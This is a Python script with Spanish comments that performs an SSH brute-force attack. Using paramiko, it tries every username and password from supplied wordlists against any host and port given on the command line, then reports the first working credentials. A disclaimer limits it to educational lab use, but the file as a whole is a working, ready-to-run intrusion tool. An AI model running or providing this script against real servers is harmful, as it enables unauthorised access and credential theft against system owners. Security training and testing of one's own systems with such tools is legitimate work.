#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
brute_force.py - Ataque de fuerza bruta SSH
-------------------------------------------
Este script realiza intentos de conexión SSH usando un diccionario
de usuarios y contraseñas, ideal para pruebas en entornos de laboratorio.

Características:
- Uso de la librería paramiko para conexiones SSH.
- Diccionario de usuarios/contraseñas configurable.
- Detención en el primer login exitoso.
- Manejo de excepciones comunes (timeout, autenticación fallida).
- Resultados claros y coloreados.

⚠️ Aviso legal:
Este script es únicamente para fines educativos en entornos
controlados. El uso contra sistemas de terceros sin autorización
es ilegal y contrario a la ética profesional.
"""

import paramiko
import argparse
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# ----------------------------
# Función de ataque SSH
# ----------------------------
def ssh_brute_force(target: str, port: int, userlist: str, passlist: str):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Leer usuarios y contraseñas
    try:
        with open(userlist, "r") as uf:
            users = [u.strip() for u in uf.readlines() if u.strip()]
        with open(passlist, "r") as pf:
            passwords = [p.strip() for p in pf.readlines() if p.strip()]
    except FileNotFoundError as e:
        print(f"{Fore.RED}[!] Error: No se encontró el archivo {e.filename}")
        return

    print(f"[+] Objetivo: {target}:{port}")
    print(f"[+] Total de usuarios: {len(users)}")
    print(f"[+] Total de contraseñas: {len(passwords)}")
    print("[+] Iniciando ataque de fuerza bruta...\n")

    # Probar combinaciones usuario/contraseña
    for user in users:
        for password in passwords:
            try:
                ssh.connect(
                    target,
                    port=port,
                    username=user,
                    password=password,
                    timeout=2,
                    banner_timeout=2,
                )
                print(f"{Fore.GREEN}[SUCCESS] Usuario: {user} | Contraseña: {password}")
                ssh.close()
                return  # detenerse al encontrar credenciales válidas
            except paramiko.AuthenticationException:
                print(f"{Fore.RED}[FAILED] {user}:{password}")
            except paramiko.SSHException:
                print(f"{Fore.YELLOW}[!] Posible bloqueo en el servidor SSH. Reintentando...")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error inesperado: {e}")

    print(f"\n{Fore.RED}[X] No se encontraron credenciales válidas.")


# ----------------------------
# Función de argumentos
# ----------------------------
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Ataque de fuerza bruta SSH (uso educativo)"
    )
    parser.add_argument("target", help="Dirección IP o dominio del objetivo")
    parser.add_argument(
        "-p", "--port", type=int, default=22, help="Puerto SSH (por defecto: 22)"
    )
    parser.add_argument(
        "-U", "--userlist", required=True, help="Archivo con lista de usuarios"
    )
    parser.add_argument(
        "-P", "--passlist", required=True, help="Archivo con lista de contraseñas"
    )
    return parser.parse_args()


# ----------------------------
# Main
# ----------------------------
if __name__ == "__main__":
    args = parse_arguments()
    ssh_brute_force(args.target, args.port, args.userlist, args.passlist)
